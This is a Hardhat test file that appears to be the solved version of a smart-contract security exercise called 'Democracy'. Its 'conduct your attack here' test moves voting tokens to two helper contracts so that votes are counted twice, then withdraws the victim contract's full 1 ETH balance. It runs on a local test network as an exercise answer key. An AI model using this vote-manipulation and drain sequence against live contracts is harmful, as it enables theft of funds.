const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        const VoterOneFactory = await ethers.getContractFactory("VoterOne");
        const voterOneContract = await VoterOneFactory.deploy(victimContract.address, attackerWallet.address);

        const VoterTwoFactory = await ethers.getContractFactory("VoterTwo");
        const voterTwoContract = await VoterTwoFactory.deploy(
            victimContract.address,
            attackerWallet.address,
            voterOneContract.address
        );

        return { victimContract, voterOneContract, voterTwoContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet, voterOneContract, voterTwoContract;
        before(async function () {
            ({ victimContract, voterOneContract, voterTwoContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
            await victimContract
                .connect(attackerWallet)
                .transferFrom(attackerWallet.address, voterOneContract.address, 0);
            await victimContract.connect(attackerWallet).vote(attackerWallet.address);
            await victimContract
                .connect(attackerWallet)
                .transferFrom(attackerWallet.address, voterTwoContract.address, 1);
            await voterTwoContract.connect(attackerWallet).vote();
            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
